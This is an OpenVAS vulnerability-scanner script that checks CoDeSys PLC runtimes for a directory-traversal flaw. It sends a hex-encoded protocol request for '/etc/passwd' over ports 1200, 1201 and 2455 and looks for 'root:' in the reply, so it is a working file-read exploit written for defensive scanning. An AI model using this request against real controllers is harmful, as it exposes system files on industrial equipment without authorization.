###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_CoDeSys_56300.nasl 5963 2017-04-18 09:02:14Z teissa $
#
# CoDeSys Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "CoDeSys is prone to a directory-traversal vulnerability and to a
vulnerability which makes it possible to get the CoDeSys command shell
without authentication on port 1200.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks and to execute any of the 
commands available vary by PLC.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103599";

if (description)
{
 script_oid(SCRIPT_OID);
 script_cve_id("CVE-2012-6069", "CVE-2012-6068");
 script_bugtraq_id(56300);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 5963 $");

 script_name("CoDeSys Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56300");
 script_xref(name : "URL" , value : "http://www.digitalbond.com/2012/10/25/new-project-basecamp-tools-for-codesys-200-vendors-affected/");
 script_xref(name : "URL" , value : "http://www.3s-software.com/");

 script_tag(name:"last_modification", value:"$Date: 2017-04-18 11:02:14 +0200 (Tue, 18 Apr 2017) $");
 script_tag(name:"creation_date", value:"2012-10-29 18:46:26 +0100 (Mon, 29 Oct 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("General");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports(1200,1201,2455);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

ports = make_list(1200,1201,2455);

foreach port(ports) {

  if(!get_port_state(port))continue;

  sock = open_sock_tcp(port);
  if(!sock)continue;

  req = raw_string(0xbb,0xbb,0x01,0x00,0x00,0x00,0x01);
  send(socket:sock, data:req);

  recv = recv(socket:sock, length:1024);
  if(!recv) {
    close(sock); 
    continue;
  }  

  req = raw_string(0xbb,0xbb,0x02,0x00,0x00,0x00,0x51,0x10);
  send(socket:sock, data:req);
  recv = recv(socket:sock, length:1024);

  req = raw_string(0xcc,0xcc,0x01,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                   0x01,0x00,0x00,0x00,0x23,0x10,0x00,0x00,0x31,0x00,0x0c,0x00,0x2f,0x65,0x74,0x63,
                   0x2f,0x70,0x61,0x73,0x73,0x77,0x64,0x00);

  send(socket:sock, data:req);

  x = 0;

  while(recv = recv(socket:sock, length:1024)) {

    buf += recv;
    x++;

    if(x > 25)break;

  }  

  close(sock);

  if(!buf)continue;

  if("root:" >< buf) {
    security_message(port:port);
    exit(0);
  }  

}  

exit(0);
